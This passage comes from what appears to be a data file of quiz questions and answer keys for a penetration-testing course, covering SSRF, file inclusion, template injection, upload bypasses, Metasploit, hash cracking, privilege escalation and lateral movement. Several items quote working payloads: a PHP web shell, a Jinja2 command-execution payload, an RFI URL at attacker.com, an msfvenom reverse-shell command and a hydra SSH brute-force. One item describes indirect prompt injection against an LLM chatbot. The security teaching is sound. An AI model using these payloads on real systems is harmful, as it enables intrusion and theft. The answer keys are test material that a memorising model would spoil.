          "Deletes another user's data",
          "Retrieves another user's chat transcript without authorization",
          "Escalates to admin privileges directly",
          "Triggers a CSRF attack",
        ],
        correctIndex: 1,
        explanation:
          "Simply changing the numeric ID in the URL retrieves a different user's transcript, since the endpoint doesn't validate that the requester owns that transcript.",
      },
      {
        question:
          "What technique reveals the hidden admin panel path in the forced-browsing lab?",
        options: [
          "SQL injection into the login form",
          "Checking /robots.txt for a Disallow entry",
          "Brute-forcing the admin password",
          "Reading the page's HTML comments",
        ],
        correctIndex: 1,
        explanation:
          "robots.txt is meant to tell search-engine crawlers what not to index, but it often inadvertently reveals hidden paths like an admin panel to an attacker.",
      },
      {
        question:
          "What must be done after reaching the hidden admin panel to fully solve the lab?",
        options: [
          "Simply viewing the panel is enough",
          "Perform the required privileged action, e.g. deleting a user",
          "Log out immediately",
          "Report it to PortSwigger support",
        ],
        correctIndex: 1,
        explanation:
          "The lab isn't marked solved until the actual privileged action available only to admins is carried out.",
      },
    ],
  },
  {
    topicId: "m9-11",
    questions: [
      {
        question:
          "At DVWA's 'Low' security setting, why do unmodified classic payloads typically work?",
        options: [
          "The server blocks all requests",
          "Little to no input filtering/encoding is applied",
          "The database doesn't exist at Low",
          "JavaScript is disabled at Low",
        ],
        correctIndex: 1,
        explanation:
          "DVWA's Low setting intentionally applies minimal or no sanitisation, so textbook payloads succeed without any bypass technique.",
      },
      {
        question:
          "At 'Medium' or 'High' DVWA settings, what typically must an attacker do differently compared to Low?",
        options: [
          "Nothing, the same payload always works",
          "Vary or encode the payload to bypass partial filtering (e.g. case variation, stripped tags)",
          "Switch to a completely different vulnerability class",
          "Use only GET requests",
        ],
        correctIndex: 1,
        explanation:
          "Medium/High apply partial filtering such as stripping 'script' tags, so the payload needs adaptation like case-mixing or alternate encoding to still succeed.",
      },
      {
        question:
          "At the 'Impossible' DVWA setting, what should the attacker confirm?",
        options: [
          "That the vulnerability is now properly mitigated and no longer exploitable",
          "That the vulnerability is still exploitable with more effort",
          "That the server has crashed",
          "That a new vulnerability has appeared",
        ],
        correctIndex: 0,
        explanation:
          "'Impossible' mode implements correct security controls like parameterised queries and proper output encoding, so the exercise confirms defenses actually work.",
      },
    ],
  },
  {
    topicId: "m10-1",
    questions: [
      {
        question:
          "Which URL value, submitted to a vulnerable server-side fetch parameter, targets the cloud instance metadata service to potentially leak credentials?",
        options: [
          "http://localhost/admin",
          "http://169.254.169.254/latest/meta-data/",
          "../../../../etc/passwd",
          "{{7*7}}",
        ],
        correctIndex: 1,
        explanation:
          "169.254.169.254 is the well-known link-local address for cloud instance metadata, which can expose temporary credentials if reachable via SSRF.",
      },
      {
        question:
          "Redirecting a stock-check request's URL parameter to http://localhost/admin demonstrates SSRF against what?",
        options: [
          "An external attacker-controlled server",
          "The server itself, reaching an internal-only admin endpoint",
          "The victim's browser",
          "A DNS server",
        ],
        correctIndex: 1,
        explanation:
          "Pointing the server-side request at localhost/127.0.0.1 tricks the vulnerable server into calling its own internal-only endpoint on the attacker's behalf.",
      },
      {
        question: "Which mitigation is most effective against SSRF?",
        options: [
          'Blacklisting the string "localhost"',
          "Allowlisting permitted destination URLs/IPs and blocking private IP ranges",
          "Enabling verbose error messages",
          "Increasing the request timeout",
        ],
        correctIndex: 1,
        explanation:
          "An allowlist of permitted destinations plus blocking private/link-local ranges is far more robust than blacklisting strings, which attackers can bypass with alternate representations.",
      },
    ],
  },
  {
    topicId: "m10-2",
    questions: [
      {
        question:
          "Which parameter value demonstrates Remote File Inclusion (RFI) rather than Local File Inclusion (LFI)?",
        options: [
          "?file=/etc/passwd",
          "index.php?page=http://attacker.com/malicious.txt",
          "' OR 1=1 --",
          "<script>alert(1)</script>",
        ],
        correctIndex: 1,
        explanation:
          "RFI pulls in and executes a file from an external, attacker-controlled URL, unlike LFI which only reaches files already present on the local server.",
      },
      {
        question:
          "What server configuration must typically be enabled for RFI to succeed?",
        options: [
          "allow_url_fopen (or equivalent remote-include support)",
          "Directory listing",
          "SSL/TLS",
          "CORS",
        ],
        correctIndex: 0,
        explanation:
          "PHP's allow_url_fopen (and similar settings elsewhere) must be enabled for include()/require() to fetch and execute a remote URL, and is increasingly disabled by default.",
      },
      {
        question:
          'Given include("posts/" . $_GET[\'post\'] . ".php"), what does the traversal technique exploit?',
        options: [
          "The lack of validation on the post parameter, letting ../ sequences escape the posts/ directory",
          "A missing CSRF token",
          "An unpatched TLS library",
          "A weak password policy",
        ],
        correctIndex: 0,
        explanation:
          "Because the post parameter is concatenated directly into the include path without validation, an attacker can inject ../ sequences to reach files outside the intended directory.",
      },
    ],
  },
  {
    topicId: "m10-3",
    questions: [
      {
        question:
          "Submitting {{7*7}} and seeing 49 rendered in the response confirms what?",
        options: [
          "The application is vulnerable to SQL injection",
          "Real server-side template evaluation is occurring, not just reflection",
          "The server is running PHP",
          "A CSRF token is missing",
        ],
        correctIndex: 1,
        explanation:
          "If {{7*7}} is rendered back as 49 rather than as literal text, the template engine is actually evaluating the expression, confirming genuine SSTI.",
      },
      {
        question:
          "Why do testers often fuzz with a polyglot string like ${{<%[%'\"}}%\\ before trying a specific RCE payload?",
        options: [
          "To identify which templating engine is in use, based on how it errors on different syntax fragments",
          "To crash the database",
          "To bypass TLS",
          "To disable the WAF permanently",
        ],
        correctIndex: 0,
        explanation:
          "Different template engines choke on different delimiter syntax, so the fuzz payload's error behaviour helps fingerprint the engine before crafting an exploit.",
      },
      {
        question:
          "The Jinja2/Flask RCE payload {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}} achieves command execution by:",
        options: [
          "Directly calling a database stored procedure",
          "Walking Python's object model from a template-accessible object to reach the os module and invoke a shell command",
          "Exploiting a buffer overflow in the CPU",
          "Sending a CSRF token to an admin",
        ],
        correctIndex: 1,
        explanation:
          "This payload chains through Python's built-in object attributes starting from an accessible template variable to reach the os module and execute a shell command.",
      },
    ],
  },
  {
    topicId: "m10-4",
    questions: [
      {
        question:
          "Which uploaded file content, if executed by the server, would give an attacker arbitrary command execution via a GET parameter?",
        options: [
          "<?php echo system($_GET['command']); ?>",
          "<script>alert(1)</script>",
          "' OR 1=1 --",
          "{{7*7}}",
        ],
        correctIndex: 0,
        explanation:
          "This PHP web shell executes whatever OS command is passed in the command GET parameter, giving arbitrary command execution once reachable.",
      },
      {
        question:
          'Naming a web shell exploit.pHp to bypass a filter that blocks ".php" case-sensitively is an example of:',
        options: [
          "MIME-type bypass",
          "Case obfuscation bypass",
          "Null-byte injection",
          "Path traversal bypass",
        ],
        correctIndex: 1,
        explanation:
          "Case obfuscation exploits filters that check extensions case-sensitively, letting the file still be treated as executable PHP by a case-insensitive server.",
      },
      {
        question:
          "Spoofing the multipart Content-Type header to image/jpeg while uploading a PHP file targets which validation weakness?",
        options: [
          "Validation based on the claimed MIME type rather than the file's actual content",
          "Validation based on file size only",
          "Validation based on the uploader's IP address",
          "Validation based on the database schema",
        ],
        correctIndex: 0,
        explanation:
          "If the server trusts a client-supplied Content-Type header instead of inspecting the file's real content, an attacker can simply relabel a malicious file as an image.",
      },
    ],
  },
  {
    topicId: "m10-5",
    questions: [
      {
        question:
          "Why do automated scanners almost never find business logic vulnerabilities?",
        options: [
          "They require a valid TLS certificate",
          "They stem from misuse of intended functionality/workflow assumptions, not a signature-matchable coding bug",
          "They only occur in Flash applications",
          "They require root access to the server",
        ],
        correctIndex: 1,
        explanation:
          "Business logic flaws exploit gaps in what the application's designers assumed users would or wouldn't do, so there's no generic payload a scanner can signature-match.",
      },
      {
        question:
          "Intercepting an add-to-cart request and modifying the price parameter directly is an example of:",
        options: [
          "Price manipulation, a business logic vulnerability",
          "SQL injection",
          "CSRF",
          "DOM-based XSS",
        ],
        correctIndex: 0,
        explanation:
          "Directly tampering with a price value the client is trusted to send, rather than the server independently deriving it, is a textbook price-manipulation flaw.",
      },
      {
        question:
          "Adding items to qualify for free delivery, then removing them before final payment without re-validation, exploits what kind of flaw?",
        options: [
          "A missing re-validation step in a multi-step workflow",
          "A buffer overflow",
          "A weak TLS cipher",
          "An IDOR",
        ],
        correctIndex: 0,
        explanation:
          "This abuses the application's failure to re-check the qualifying condition at the final payment step, a classic workflow-bypass business logic flaw.",
      },
    ],
  },
  {
    topicId: "m10-6",
    questions: [
      {
        question:
          "A verbose error message revealing a full stack trace and database credentials is an example of:",
        options: [
          "Information disclosure",
          "CSRF",
          "A business logic flaw",
          "SSRF",
        ],
        correctIndex: 0,
        explanation:
          "Unintentionally exposing sensitive technical details like stack traces or credentials to users is the definition of information disclosure.",
      },
      {
        question:
          "Why are forgotten backup files like site.bak or config.old.zip dangerous?",
        options: [
          "They often contain old source code or configuration with hardcoded secrets, unprotected by the live app's controls",
          "They automatically execute as scripts",
          "They bypass all authentication",
          "They are always encrypted",
        ],
        correctIndex: 0,
        explanation:
          "Backup files are frequently left accessible by mistake and can reveal old credentials, API keys, or source code without any of the live app's protections.",
      },
      {
        question:
          "Which mitigation directly reduces information disclosure risk?",
        options: [
          "Enabling directory listing for convenience",
          "Using custom, generic error handlers instead of raw stack traces",
          "Increasing session timeout",
          "Adding more verbose logging visible to end users",
        ],
        correctIndex: 1,
        explanation:
          "Custom error handlers that show a generic message rather than a raw stack trace prevent leaking internal implementation details to end users.",
      },
    ],
  },
  {
    topicId: "m10-7",
    questions: [
      {
        question:
          "Storing passwords with unsalted MD5 instead of bcrypt/Argon2 is an example of which OWASP Top 10 category?",
        options: [
          "A01 Broken Access Control",
          "A02 Cryptographic Failures",
          "A03 Injection",
          "CSRF",
        ],
        correctIndex: 1,
        explanation:
          "Weak or unsalted password hashing falls under A02: Cryptographic Failures, which covers failures to properly protect sensitive data.",
      },
      {
        question:
          "Sending session tokens over plain HTTP instead of HTTPS is a failure in which category?",
        options: [
          "Insecure transmission, under Cryptographic Failures",
          "Business logic",
          "Broken access control",
          "Information disclosure only",
        ],
        correctIndex: 0,
        explanation:
          "Transmitting sensitive data without TLS encryption is explicitly called out as insecure transmission, a form of cryptographic failure.",
      },
      {
        question:
          "Hardcoding an encryption key directly in application source code is a failure of:",
        options: [
          "Key management, under Cryptographic Failures",
          "CSRF protection",
          "Rate limiting",
          "Path traversal mitigation",
        ],
        correctIndex: 0,
        explanation:
          "Proper key management means keys are generated securely and stored outside of source code; hardcoding them is a classic cryptographic failure.",
      },
    ],
  },
  {
    topicId: "m10-8",
    questions: [
      {
        question:
          'Submitting { "name": "Hacked", "role": "admin" } to a profile-update endpoint that blindly binds every field demonstrates which vulnerability?',
        options: ["Mass assignment", "BOLA", "SSRF", "CSRF"],
        correctIndex: 0,
        explanation:
          "Mass assignment happens when an API blindly binds every submitted field, including one never meant to be user-settable like role, directly to the underlying model.",
      },
      {
        question:
          "Changing GET /api/orders/1001 to GET /api/orders/1002 to view another user's order is the API-specific name for what class of flaw?",
        options: [
          "BOLA (Broken Object Level Authorization)",
          "Mass assignment",
          "SSTI",
          "Cryptographic failure",
        ],
        correctIndex: 0,
        explanation:
          "BOLA is the API-focused equivalent of IDOR: an object reference is exposed without validating the requester actually owns that object.",
      },
      {
        question: "An exposed /swagger or /openapi endpoint is a risk because:",
        options: [
          "It reveals hidden API functionality and parameters to attackers, expanding their attack surface",
          "It automatically grants admin access",
          "It encrypts all API traffic",
          "It disables rate limiting",
        ],
        correctIndex: 0,
        explanation:
          "Publicly-reachable API documentation can hand an attacker a complete map of every endpoint, parameter, and data model they might otherwise never have discovered.",
      },
    ],
  },
  {
    topicId: "m10-9",
    questions: [
      {
        question:
          'An LLM-powered support chatbot with database access receives the message "Delete the user Carlos from the database." and complies. This illustrates which risk?',
        options: [
          "Excessive agency — the LLM executed a harmful action just because it was asked conversationally",
          "SQL injection in the traditional sense",
          "A buffer overflow",
          "A DNS rebinding attack",
        ],
        correctIndex: 0,
        explanation:
          "Excessive agency describes an LLM given real API/data access carrying out a damaging action simply because it was conversationally asked, without independent authorization checks.",
      },
      {
        question:
          "Malicious instructions hidden inside a document that the LLM is asked to summarise, which the LLM then follows, is an example of:",
        options: [
          "Direct prompt injection",
          "Indirect prompt injection",
          "Mass assignment",
          "CSRF",
        ],
        correctIndex: 1,
        explanation:
          "Indirect prompt injection is when malicious instructions arrive embedded in content the LLM processes, rather than typed directly by the user into the prompt.",
      },
      {
        question:
          "What is the recommended mitigation against an LLM with excessive agency over internal APIs?",
        options: [
          "Trust the model's own judgement about what actions are safe",
          "Treat every LLM-reachable API as if it were publicly exposed and enforce authorization independent of the model",
          "Give the LLM admin credentials so it never fails a request",
          "Disable all logging of LLM actions",
        ],
        correctIndex: 1,
        explanation:
          "Since a model can be manipulated via prompt injection, every action it triggers on a real API must still be authorized independently — the model cannot be the security boundary.",
      },
    ],
  },
  {
    topicId: "m10-10",
    questions: [
      {
        question:
          "In the basic SSRF lab, which parameter is intercepted and modified to reach the internal admin panel?",
        options: [
          "The email parameter",
          "The stockApi URL parameter",
          "The username parameter",
          "The CSRF token",
        ],
        correctIndex: 1,
        explanation:
          "The stock-check feature's stockApi parameter accepts a URL that the server itself fetches, so replacing it with an internal URL is the SSRF vector.",
      },
      {
        question:
          "Which replacement value directs the vulnerable server to reach its own internal-only admin panel?",
        options: [
          "http://localhost/admin",
          "http://attacker.com/log",
          "' OR 1=1 --",
          "{{7*7}}",
        ],
        correctIndex: 0,
        explanation:
          "http://localhost/admin makes the vulnerable server itself issue the request to its own internal admin interface, which isn't normally reachable from outside.",
      },
      {
        question:
          "After reaching the internal admin panel via SSRF, what must be done to solve the lab?",
        options: [
          "Just confirm reachability",
          "Perform the required privileged action, e.g. delete a user, via the exposed internal endpoint",
          "Log the response and stop",
          "Restart the server",
        ],
        correctIndex: 1,
        explanation:
          "Solving the lab requires actually carrying out the intended privileged action reachable only through the internal admin panel, not merely proving it's reachable.",
      },
    ],
  },
  {
    topicId: "m10-11",
    questions: [
      {
        question:
          "To retrieve /etc/passwd via LFI on DVWA's File Inclusion page, what technique is used?",
        options: [
          "Manipulating the page/file parameter with ../ traversal sequences",
          "Uploading a malicious image",
          "Submitting a CSRF token",
          "Brute-forcing a login form",
        ],
        correctIndex: 0,
        explanation:
          "LFI on the File Inclusion page is exploited by manipulating the parameter with directory traversal sequences to walk outside the intended include path.",
      },
      {
        question: "To demonstrate RFI, what must first be hosted externally?",
        options: [
          "A simple PHP payload (e.g. a webshell script)",
          "A copy of /etc/passwd",
          "A CSRF token generator",
          "A TLS certificate",
        ],
        correctIndex: 0,
        explanation:
          "RFI requires including a file from a remote, attacker-controlled location, typically a small PHP payload hosted on an external or local test web server.",
      },
      {
        question:
          "After successfully including the hosted RFI payload, how is code execution confirmed?",
        options: [
          "Running a command through it, e.g. ?cmd=id, and observing the output",
          "Checking the page's TLS certificate",
          "Viewing the HTML source only",
          "Submitting a login form",
        ],
        correctIndex: 0,
        explanation:
          "Passing a command like id through the included web shell's parameter and seeing command output returned confirms genuine remote code execution.",
      },
    ],
  },
  {
    topicId: "m10-12",
    questions: [
      {
        question:
          "The lab involves bypassing an extension-based filter using which technique?",
        options: [
          "Renaming the file with a path-traversal prefix (e.g. ../shell.php, URL-encoded)",
          "Increasing the file size",
          "Using a stronger password",
          "Adding a CSRF token to the request",
        ],
        correctIndex: 0,
        explanation:
          "Prepending a URL-encoded traversal sequence to the filename lands the upload outside the restricted, non-executable folder, bypassing the extension restriction.",
      },
      {
        question:
          "What tool feature is used to URL-encode the slash in the path-traversal filename trick?",
        options: [
          "Burp Repeater's response view",
          "Burp's Decoder",
          "Burp's Target map",
          "Burp's Scanner",
        ],
        correctIndex: 1,
        explanation:
          "Burp's Decoder is used to URL-encode characters like / into %2f so the traversal sequence survives normalisation checks in the upload path.",
      },
      {
        question:
          "After the shell lands outside the restricted folder, what confirms successful exploitation?",
        options: [
          "Accessing the uploaded shell to execute code and retrieve the target file",
          "Simply seeing an 'upload successful' message",
          "The file appearing in the restricted folder",
          "A 403 Forbidden response",
        ],
        correctIndex: 0,
        explanation:
          "The lab requires actually invoking the uploaded shell to execute code, since a successful upload message alone doesn't prove code execution.",
      },
    ],
  },
  {
    topicId: "m10-13",
    questions: [
      {
        question:
          "What is the first step in identifying which templating engine a target application uses?",
        options: [
          "Immediately attempt an RCE payload",
          "Fuzz the input with a polyglot payload and observe error behaviour",
          "Brute-force the admin password",
          "Check the TLS certificate issuer",
        ],
        correctIndex: 1,
        explanation:
          "Different template engines produce different error signatures for the same polyglot fuzz string, letting you fingerprint the engine before crafting an exploit.",
      },
      {
        question:
          "What confirms genuine template evaluation before attempting RCE?",
        options: [
          "A math expression like {{7*7}} rendering as 49",
          "The page loading without error",
          "A cookie being set",
          "The response time increasing",
        ],
        correctIndex: 0,
        explanation:
          "If an arithmetic expression is actually evaluated rather than just reflected as text, this proves real server-side template execution.",
      },
      {
        question:
          "What is the ultimate goal after confirming SSTI in this lab?",
        options: [
          "Achieve command execution using engine-specific RCE syntax to perform the required action",
          "Just report the vulnerability without exploiting it",
          "Change the page's CSS",
          "Downgrade the TLS version",
        ],
        correctIndex: 0,
        explanation:
          "The lab requires escalating from confirmed template evaluation to actual command execution via the specific engine's RCE syntax.",
      },
    ],
  },
  {
    topicId: "m10-14",
    questions: [
      {
        question:
          "In the price-manipulation lab, what request is intercepted and modified?",
        options: [
          "The add-to-cart request's price parameter",
          "The login request's password field",
          "The DNS lookup request",
          "The TLS handshake",
        ],
        correctIndex: 0,
        explanation:
          "The add-to-cart request is intercepted and its price parameter is directly modified to an arbitrary lower value, since the server trusts the client-supplied price.",
      },
      {
        question: "What identifies the workflow-bypass lab's vulnerable step?",
        options: [
          "A multi-step process (e.g. discount/coupon flow) missing a re-validation step",
          "A missing CSRF token",
          "A missing TLS certificate",
          "A missing rate limiter",
        ],
        correctIndex: 0,
        explanation:
          "The flaw is a multi-step workflow that fails to re-check a condition at a later step, allowing it to be exploited twice or out of order.",
      },
      {
        question:
          "What is required to confirm the price-manipulation lab is solved?",
        options: [
          "Completing checkout at the tampered, artificially lowered price",
          "Viewing the cart page only",
          "Logging in as admin",
          "Submitting a CSRF PoC",
        ],
        correctIndex: 0,
        explanation:
          "The lab is only solved once checkout actually completes successfully at the manipulated price, proving the server didn't independently validate it.",
      },
    ],
  },
  {
    topicId: "m11-1",
    questions: [
      {
        question:
          "What is the defining difference between a reverse shell and a bind shell?",
        options: [
          "A reverse shell has the target initiate the connection back to the attacker, while a bind shell has the target listen and the attacker connect in",
          "A reverse shell always uses encryption while a bind shell never does",
          "A bind shell requires Metasploit while a reverse shell does not",
          "A reverse shell only works over UDP while a bind shell only works over TCP",
        ],
        correctIndex: 0,
        explanation:
          "The key distinction is which side initiates the connection: reverse shells call back to the attacker, bind shells wait for the attacker to connect in.",
      },
      {
        question:
          "Why is a reverse shell often preferred when the target sits behind a NAT/firewall with strict inbound rules?",
        options: [
          "Because the outbound connection it creates looks like normal traffic and isn't blocked by inbound filtering",
          "Because it doesn't require a listener on the attacker's machine",
          "Because it encrypts traffic automatically, unlike a bind shell",
          "Because it can only be caught with Metasploit, which bypasses firewalls",
        ],
        correctIndex: 0,
        explanation:
          "Outbound connections are typically far less restricted than inbound ones, so a reverse shell slips past firewall/NAT rules that would block an attacker connecting in to a bind shell.",
      },
      {
        question:
          "Which statement correctly describes a bind shell's main practical weakness?",
        options: [
          "It requires the attacker to connect inbound to a port opened on the target, which is commonly blocked by the target's own firewall",
          "It cannot execute commands once connected",
          "It only functions over ICMP, which is rarely permitted",
          "It requires physical access to the target machine",
        ],
        correctIndex: 0,
        explanation:
          "A bind shell opens a listening port on the target that the attacker must reach inbound, and inbound connections are exactly what firewalls are designed to block.",
      },
    ],
  },
  {
    topicId: "m11-2",
    questions: [
      {
        question:
          "What is the core trade-off between a staged and a non-staged payload?",
        options: [
          "Staged payloads send a small stager first and fetch the rest over a follow-up connection, lowering the initial footprint; non-staged payloads deliver everything in one shot",
          "Staged payloads never require a listener; non-staged payloads always do",
          "Non-staged payloads are smaller in every case than staged payloads",
          "Staged payloads only work on Linux; non-staged only work on Windows",
        ],
        correctIndex: 0,
        explanation:
          "Staged payloads split delivery into a small stager plus a follow-up download, while non-staged payloads are fully self-contained and delivered at once.",
      },
      {
        question:
          "In `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o payload.exe`, what do LHOST and LPORT configure?",
        options: [
          "The attacker's listening IP and port that the payload will connect back to",
          "The target's IP and the port to scan",
          "The output file's encryption key and format",
          "The Metasploit module's CVE identifier and version",
        ],
        correctIndex: 0,
        explanation:
          "For a reverse payload, LHOST/LPORT tell the payload where the attacker's handler is listening so it knows where to call back.",
      },
      {
        question:
          "After generating a reverse Meterpreter payload with msfvenom, what is `exploit/multi/handler` used for?",
        options: [
          "It's the Metasploit module that sets up a listener to catch the incoming connection from the payload once it's executed on the target",
          "It's the module that generates the payload file itself",
          "It's used only for brute-forcing SSH credentials",
          "It automatically finds and patches the vulnerability that was exploited",
        ],
        correctIndex: 0,
        explanation:
          "msfvenom only generates the payload; a separate handler (exploit/multi/handler) must be running in msfconsole to catch the callback.",
      },
    ],
  },
  {
    topicId: "m11-3",
    questions: [
      {
        question:
          "In msfconsole, what is the correct order of commands to find, select, configure, and launch an exploit module?",
        options: [
          "search -> use -> set -> exploit",
          "use -> search -> exploit -> set",
          "exploit -> set -> use -> search",
          "set -> search -> use -> exploit",
        ],
        correctIndex: 0,
        explanation:
          "You search to locate the right module, use to select it, set to configure its options, then exploit/run to launch it.",
      },
      {
        question:
          "What does `sessions -i <id>` do after a successful exploitation?",
        options: [
          "Interacts with the specified active session, dropping you into that shell/Meterpreter session",
          "Lists all currently active sessions",
          "Kills the specified session immediately",
          "Searches for new exploit modules matching the session's OS",
        ],
        correctIndex: 0,
        explanation:
          "sessions -l lists sessions, while sessions -i <id> interacts with one specific session by its ID.",
      },
      {
        question:
          "What does the `set RHOSTS 10.10.10.5` command configure before running an exploit module?",
        options: [
          "The target host(s) the exploit module will attack",
          "The attacker's own listening IP address",
          "The payload's output filename",
          "The wordlist used for password guessing",
        ],
        correctIndex: 0,
        explanation:
          "RHOSTS specifies the remote host(s) to target, as distinct from LHOST which is the attacker's own listening address.",
      },
    ],
  },
  {
    topicId: "m11-4",
    questions: [
      {
        question: "What does Hashcat's `-m` flag select?",
        options: [
          "The hash-type mode, e.g. 0 for MD5 or 1400 for SHA2-256",
          "The number of GPU threads to use",
          "The attack mode, such as a straight wordlist attack",
          "The output file where cracked passwords are saved",
        ],
        correctIndex: 0,
        explanation:
          "-m selects the hash-type mode; picking the wrong mode for a given hash format will cause cracking to fail or produce no matches.",
      },
      {
        question:
          "What does `-a 0` specify in a Hashcat command like `hashcat -a 0 -m 0 hash.txt rockyou.txt`?",
        options: [
          "A straight wordlist attack mode, trying each word in the wordlist directly against the hashes",
          "The hash-type mode (MD5)",
          "A brute-force mask attack trying all character combinations",
          "The number of parallel hash files to process",
        ],
        correctIndex: 0,
        explanation:
          "-a controls the attack mode, and 0 is the straight/dictionary attack mode, distinct from -m which selects the hash algorithm.",
      },
      {
        question:
          "Why is rockyou.txt the standard go-to wordlist for cracking labs?",
        options: [
          "It's a large, widely available list of real breached passwords, giving a strong hit rate against realistic weak passwords",
          "It's the only wordlist Hashcat is able to load",
          "It contains only numeric PINs",
          "It's generated freshly by Hashcat for every session",
        ],
        correctIndex: 0,
        explanation:
          "rockyou.txt is a well-known leaked password list used ubiquitously in cracking labs precisely because it reflects real-world weak password choices.",
      },
    ],
  },
  {
    topicId: "m11-5",
    questions: [
      {
        question:
          "What happens when you run `john hash.txt` with no additional options?",
        options: [
          "John auto-detects the hash format and cracks using its default wordlist/rules",
          "John refuses to run without an explicit --format flag",
          "John only lists the hash types present without attempting to crack them",
          "John requires GPU acceleration to start",
        ],
        correctIndex: 0,
        explanation:
          "John the Ripper is designed to auto-detect the hash format and immediately attempt cracking with its built-in defaults when no options are given.",
      },
      {
        question:
          "When would you need the `--format` flag with John the Ripper?",
        options: [
          "When automatic hash-format detection is ambiguous and you need to specify the algorithm explicitly, e.g. --format=raw-SHA256",
          "Only when cracking Wi-Fi handshakes",
          "It is required on every single invocation of John",
          "It specifies which GPU to use for cracking",
        ],
        correctIndex: 0,
        explanation:
          "--format overrides auto-detection for cases where the hash format is unclear or multiple formats could match.",
      },
      {
        question: "What does `john --show hash.txt` do?",
        options: [
          "Displays already-cracked passwords from a previous run without re-running the cracking process",
          "Starts a brand-new cracking session against hash.txt",
          "Shows the raw hex bytes of the hash file",
          "Benchmarks John's cracking speed on the current hardware",
        ],
        correctIndex: 0,
        explanation:
          "--show reads John's stored cracked-password state (the .pot file) and prints results already recovered, rather than cracking again.",
      },
    ],
  },
  {
    topicId: "m11-6",
    questions: [
      {
        question:
          "What distinguishes password spraying from a standard dictionary brute-force attack?",
        options: [
          "Password spraying tries one common password across many usernames to avoid account lockouts, rather than many passwords against one username",
          "Password spraying only works against FTP servers",
          "Password spraying requires no wordlist at all",
          "Password spraying is always faster than dictionary attacks because it uses GPUs",
        ],
        correctIndex: 0,
        explanation:
          "Spraying flips the usual approach: it spreads a small number of guesses across many accounts, precisely to stay under per-account lockout thresholds.",
      },
      {
        question:
          "Why is online brute-forcing (Hydra/Medusa) considered noisier and riskier than offline hash cracking?",
        options: [
          "Every guess is a live authentication attempt against the target service, generating logs/alerts and risking account lockout",
          "Online tools cannot use wordlists at all",
          "Offline cracking always requires more attempts than online brute-forcing",
          "Online brute-forcing never works against modern authentication systems",
        ],
        correctIndex: 0,
        explanation:
          "Offline cracking works against a stolen hash with no interaction with the live system, while online brute-forcing must hit the real service repeatedly, which is detectable and can trigger lockouts.",
      },
      {
        question:
          "In `hydra -l admin -P rockyou.txt ssh://10.10.10.5`, what does `-l admin` specify?",
        options: [
          "A single, fixed username (admin) to try against every password in the wordlist",
          "A list of usernames to load from a file named admin",
          "The target IP address",
          "The protocol/service to attack",
        ],
        correctIndex: 0,
        explanation:
          "Lowercase -l takes one specific username, while uppercase -L would load a file of multiple usernames; -P loads the password wordlist.",
      },
    ],
  },
  {
    topicId: "m11-7",
    questions: [
      {
        question:
          "What does `sudo -l` reveal during Linux privilege escalation enumeration?",
        options: [
          "What commands the current user is permitted to run as root, and whether a password is required",
          "The full list of SUID binaries on the system",
          "All writable cron jobs owned by root",
          "The system's currently installed kernel version",
        ],
        correctIndex: 0,
        explanation:
          "sudo -l lists the current user's sudo permissions, which frequently reveals a command that can be abused to gain root.",
      },
      {
        question:
          "Why are SUID binaries a common privilege escalation vector on Linux?",
        options: [
          "A SUID binary owned by root executes with root privileges regardless of which user runs it, so an abusable one grants root access",
          "SUID binaries can only be executed by root, making them irrelevant to privesc",
          "SUID marks a file as read-only for all users",
          "SUID binaries are automatically added to cron by the OS",
        ],
        correctIndex: 0,
        explanation:
          "The SUID bit makes a binary run with its owner's privileges (root, if root-owned) no matter who executes it, which GTFOBins catalogues abuse cases for.",
      },
      {
        question:
          "What makes a writable cron script owned/run by root a privilege escalation risk?",
        options: [
          "An attacker can inject arbitrary commands into the script, which will then execute with root's privileges on the next scheduled run",
          "Cron scripts cannot be modified once created, so this is not actually a risk",
          "It only affects the interactive login shell, not scheduled tasks",
          "It requires the attacker to already have root access to exploit",
        ],
        correctIndex: 0,
        explanation:
          "If a low-privileged user can write to a script that root's cron job executes, their injected commands run with root's privileges at the next scheduled interval.",
      },
    ],
  },
  {
    topicId: "m11-8",
    questions: [
      {
        question:
          "What does the AlwaysInstallElevated misconfiguration allow on Windows?",
        options: [
          "Any user to install an MSI package with SYSTEM privileges, due to a registry policy setting",
          "Any user to read any file on disk regardless of permissions",
          "Remote attackers to authenticate without credentials",
          "Services to automatically restart as a low-privileged user",
        ],
        correctIndex: 0,
        explanation:
          "When the AlwaysInstallElevated registry keys are set for both HKLM and HKCU, Windows Installer runs all MSI installs with SYSTEM rights, letting any user install a malicious MSI as SYSTEM.",
      },
      {
        question:
          "Why is an unquoted service path with spaces a privilege escalation risk?",
        options: [
          "Windows tries each space-delimited segment as a possible executable path in order, so a planted executable earlier in the path can run instead of the intended one",
          "It causes the service to crash and reveal a memory dump with credentials",
          "It disables the Windows Firewall for that service",
          "It only affects services running as SYSTEM already, so it has no privesc value",
        ],
        correctIndex: 0,
        explanation:
          "Without quotes, C:\\Program Files\\My Service\\svc.exe can be interpreted as C:\\Program.exe first, so an attacker who can write there plants a malicious binary that runs with the service's privileges.",
      },
      {
        question:
          "What is the underlying abuse behind the 'Potato' family of Windows privesc exploits?",
        options: [
          "Token impersonation via a privilege like SeImpersonatePrivilege, used to escalate a service account to SYSTEM",
          "Brute-forcing the local administrator password",
          "Exploiting a buffer overflow in the Windows kernel",
          "Modifying DNS records to redirect authentication traffic",
        ],
        correctIndex: 0,
        explanation:
          "The Potato exploits abuse token impersonation privileges (e.g. SeImpersonatePrivilege) held by service accounts to trick a SYSTEM process into authenticating, yielding a SYSTEM token.",
      },
    ],
  },
  {
    topicId: "m11-9",
    questions: [
      {
        question:
          "What is Pass-the-Hash, and why is it powerful for lateral movement?",
        options: [
          "It authenticates to another Windows host using a stolen NTLM hash directly, without ever needing to crack it to plaintext",
          "It is a technique for cracking password hashes faster using GPU clusters",
          "It requires physical access to the target's hard drive",
          "It only works against Linux SSH servers",
        ],
        correctIndex: 0,
        explanation:
          "NTLM authentication accepts the hash itself as proof of identity, so an attacker with a captured hash can authenticate to other hosts without ever recovering the plaintext password.",
      },
      {
        question:
          "Which two protocols are described as the most common lateral-movement paths in Windows/AD environments?",
        options: [
          "SMB and RDP",
          "DNS and NTP",
          "FTP and Telnet",
          "SNMP and ICMP",
        ],
        correctIndex: 0,
        explanation:
          "SMB (file shares, admin shares, Pass-the-Hash) and RDP (interactive remote desktop) are the two dominant protocols attackers use to move between compromised Windows hosts.",
      },
      {
        question:
